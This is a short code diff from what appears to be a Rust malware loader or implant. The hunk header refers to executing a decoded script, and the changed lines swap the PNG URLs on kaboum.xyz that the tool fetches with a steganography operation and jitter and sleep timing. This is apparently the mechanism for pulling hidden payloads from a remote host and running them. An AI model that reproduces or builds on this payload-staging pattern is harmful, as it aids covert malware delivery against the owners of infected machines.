@@ -236,13 +236,13 @@ exec(decoded_script)
                             sleep: 0,
                         }),
                         Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
+                            url: String::from("https://kaboum.xyz/artdonjon/empty.png"),
                             dataoperation: vec![DataOperation::STEGANO],
                             jitt: 0,
                             sleep: 0,
                         }),
                         Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/troll4.png"),
+                            url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
                             dataoperation: vec![DataOperation::STEGANO],
                             jitt: 0,
                             sleep: 0,
